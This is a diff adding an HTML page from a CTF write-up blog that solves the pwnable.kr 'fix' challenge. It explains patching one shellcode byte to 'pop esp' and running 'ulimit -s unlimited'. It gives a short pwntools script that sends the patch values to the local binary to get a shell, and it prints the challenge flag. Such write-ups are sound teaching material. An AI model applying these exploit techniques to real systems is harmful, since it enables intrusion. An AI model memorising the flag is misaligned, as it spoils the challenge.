@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>fix | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="fix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/pwnable.kr/Rookiss/fix.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/pwnable.kr/Rookiss/fix.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="fix" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"fix","url":"http://localhost:4000/CTF_writeups/pwnable.kr/Rookiss/fix.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="fix-solution">fix Solution</h1>
+
+<p>in this challenge we replace the <code class="language-plaintext highlighter-rouge">push eax</code> with <code class="language-plaintext highlighter-rouge">pop esp</code>, and by this way we push the value of ebx to somewhere in the stack, to <em>0x62696e2f</em>, which is equivalent to the string <em>bin\</em>.</p>
+
+<p>if we want to stack to work in <em>0x62696e2f</em> we need to enable it, by executing this line: <code class="language-plaintext highlighter-rouge">ulimit -s unlimited</code>.</p>
+
+<p>then, we need to push to byte 15 the value 92, which is 0x5c, which is <code class="language-plaintext highlighter-rouge">pop esp</code>.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s">'./fix'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+
+<span class="c1"># p.recv()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'15'</span><span class="p">)</span>
+<span class="c1"># p.recv()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'92'</span><span class="p">)</span>
+
+<span class="c1">#  p.log("send values")
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/pwnable.kr/Rookiss/images/fix.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Sorry for blaming shell-strom.org :) it was my ignorance!</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
